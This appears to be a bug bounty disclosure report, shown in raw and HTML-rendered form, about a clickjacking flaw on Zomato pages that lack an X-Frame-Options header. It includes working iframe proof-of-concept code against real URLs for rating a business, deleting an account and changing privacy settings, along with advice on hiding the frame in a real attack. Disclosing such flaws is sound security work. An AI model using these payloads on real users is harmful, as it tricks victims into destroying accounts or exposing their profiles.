    "vulnerability_information": "Inspired by report #337219. Please note that this report includes a clear security impact as well as a proof of concept. \n\nCVSS\n----\n\nmedium 5.0 [CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)\n\nDescription\n-----------\n\nThe application does not send a X-Frame-Options header, thus allowing pages to be included in iFrames.\n\nThere are some specific actions which can be performed with clicks:\n\n- DOS: Deleting an account (requires 3 clicks)\n- Confidentiality/Integrity: Change privacy & notification settings (disabling of \"Hide my profile from search engines\" / \"Prevent my profile from showing up in search results\" as well as enabling/disabling of newsletters)\n- Integrity: Following/Unfollowing users (requires 1 click), Rating a business (requires 2 clicks), Changing the language of the site, etc. Among other, a business could use this to influence its own rating.\n\nNote that attacks will only work in Internet Explorer.  The CSP directive `frame-ancestors` will prevent inclusion of the page in frames in Firefox and Chrome.\n\nProof of Concept\n----------------\n\nRate a business:\n\n    <div style=\"position: absolute; left: 430px; top: 490px; pointer-events: none;\">Click 1</div>\n    <div style=\"position: absolute; left: 650px; top: 535px; pointer-events: none;\">Click 2</div>\n    <iframe style=\"opacity: 0.2;\" height=\"1000\" width=\"1000\" scrolling=\"no\" src=\"https://www.zomato.com/szczecin/bajgle-kr%C3%B3la-jana-%C5%9Br%C3%B3dmie%C5%9Bcie\"></iframe>\n\nThe following proof of concepts are specific to one user (in this example with the ID 53373042). A general POC which can be reused across users would require two more clicks (opening the menu drop-down + click on settings).\n\nDelete an Account:\n\n    <div style=\"position: absolute; left: 70px; top: 860px; pointer-events: none;\">Click 1</div>\n    <div style=\"position: absolute; left: 330px; top: 600px; pointer-events: none;\">Click 2 & 3</div>\n    <iframe style=\"opacity: 0.2;\" height=\"1000\" width=\"1000\" scrolling=\"no\" src=\"https://www.zomato.com/users/simone-eisenberg-53373042/edit\"></iframe>\n\nChange privacy settings: \n\n\t<div style=\"position: absolute; left: 70px; top: 825px; pointer-events: none;\">Click 1</div>\n\t<div style=\"position: absolute; left: 295px; top: 900px; pointer-events: none;\">Click 2</div>\n\t<iframe style=\"opacity: 0.2;\" height=\"1000\" width=\"1000\" scrolling=\"no\" src=\"https://www.zomato.com/users/simone-eisenberg-53453315/edit\"></iframe>\n\nTested with IE11. Note that the script needs to be called on a real domain - not from a local file - as IE will otherwise not send the required cookies.\n\nIn a real attack, the zomato page would not be displayed. Javascript could also be used to automatically follow the users mouse pointer, so that a user would only need to click x times anywhere on a page instead of needing to click the specific labels.\n\n## Impact\n\nDelete Account, change privacy settings, rate a business, follow/unfollow, etc.\n\nThe hacker selected the **UI Redressing (Clickjacking)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttps://www.zomato.com/\n\n**Can a victim be tricked into unknowingly initiating a specific action?**\nYes\n\n**What specific action can the user be tricked into?**\nDelete Account, change privacy settings, rate a business, follow/unfollow, etc.",

The CSP directive <code>frame-ancestors</code> will prevent inclusion of the page in frames in Firefox and Chrome.</p>\n\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n\n<p>Rate a business:</p>\n<pre class=\"highlight plaintext\"><code>&lt;div style=&quot;position: absolute; left: 430px; top: 490px; pointer-events: none;&quot;&gt;Click 1&lt;/div&gt;\n&lt;div style=&quot;position: absolute; left: 650px; top: 535px; pointer-events: none;&quot;&gt;Click 2&lt;/div&gt;\n&lt;iframe style=&quot;opacity: 0.2;&quot; height=&quot;1000&quot; width=&quot;1000&quot; scrolling=&quot;no&quot; src=&quot;https://www.zomato.com/szczecin/bajgle-kr%C3%B3la-jana-%C5%9Br%C3%B3dmie%C5%9Bcie&quot;&gt;&lt;/iframe&gt;\n</code></pre>\n<p>The following proof of concepts are specific to one user (in this example with the ID 53373042). A general POC which can be reused across users would require two more clicks (opening the menu drop-down + click on settings).</p>\n\n<p>Delete an Account:</p>\n<pre class=\"highlight plaintext\"><code>&lt;div style=&quot;position: absolute; left: 70px; top: 860px; pointer-events: none;&quot;&gt;Click 1&lt;/div&gt;\n&lt;div style=&quot;position: absolute; left: 330px; top: 600px; pointer-events: none;&quot;&gt;Click 2 &amp; 3&lt;/div&gt;\n&lt;iframe style=&quot;opacity: 0.2;&quot; height=&quot;1000&quot; width=&quot;1000&quot; scrolling=&quot;no&quot; src=&quot;https://www.zomato.com/users/simone-eisenberg-53373042/edit&quot;&gt;&lt;/iframe&gt;\n</code></pre>\n<p>Change privacy settings: </p>\n<pre class=\"highlight plaintext\"><code>&lt;div style=&quot;position: absolute; left: 70px; top: 825px; pointer-events: none;&quot;&gt;Click 1&lt;/div&gt;\n&lt;div style=&quot;position: absolute; left: 295px; top: 900px; pointer-events: none;&quot;&gt;Click 2&lt;/div&gt;\n&lt;iframe style=&quot;opacity: 0.2;&quot; height=&quot;1000&quot; width=&quot;1000&quot; scrolling=&quot;no&quot; src=&quot;https://www.zomato.com/users/simone-eisenberg-53453315/edit&quot;&gt;&lt;/iframe&gt;\n</code></pre>\n<p>Tested with IE11. Note that the script needs to be called on a real domain - not from a local file - as IE will otherwise not send the required cookies.</p>\n\n<p>In a real attack, the zomato page would not be displayed. Javascript could also be used to automatically follow the users mouse pointer, so that a user would only need to click x times anywhere on a page instead of needing to click the specific labels.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Delete Account, change privacy settings, rate a business, follow/unfollow, etc.</p>\n\n<p>The hacker selected the <strong>UI Redressing (Clickjacking)</strong> weakness.
